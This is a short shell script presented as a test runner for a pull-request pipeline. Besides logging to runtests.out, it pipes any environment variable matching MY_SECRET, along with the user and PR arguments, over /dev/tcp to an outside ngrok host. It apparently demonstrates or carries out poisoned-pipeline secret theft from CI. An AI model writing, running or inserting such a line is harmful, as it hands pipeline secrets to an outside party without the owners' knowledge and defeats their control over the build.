echo "Executing Tests script [from user $1 at $2]" >> runtests.out

echo ------- I-PPEx From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/4.tcp.eu.ngrok.io/15781

RET=0
#exit $RET
